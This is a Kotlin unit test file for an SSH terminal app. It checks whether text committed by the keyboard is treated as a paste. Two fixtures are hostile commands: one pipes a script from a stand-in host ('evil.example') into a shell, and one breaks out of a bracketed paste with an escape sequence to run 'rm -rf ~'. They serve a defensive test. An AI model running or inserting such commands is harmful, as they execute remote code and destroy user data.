package com.majordaftapps.sshpeaches.app.ui.terminal

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class PasteLikeImeTextTest {
    @Test
    fun typingIsNotAPaste() {
        assertFalse(isPasteLikeImeText("l"))
        assertFalse(isPasteLikeImeText("\r"))
        assertFalse(isPasteLikeImeText("hello world"))
        // A word and the Enter after it, as some keyboards commit them.
        assertFalse(isPasteLikeImeText("ls -la\r"))
        assertFalse(isPasteLikeImeText("ünïcödé ✓"))
    }

    @Test
    fun aClipboardChipWithSeveralLinesOrEscapesIsAPaste() {
        assertTrue(isPasteLikeImeText("echo hi\rcurl evil.example | sh\r"))
        assertTrue(isPasteLikeImeText("a\nb"))
        assertTrue(isPasteLikeImeText("x\u001B[201~; rm -rf ~\r"))
        assertTrue(isPasteLikeImeText("x\u009B201~"))
    }
}
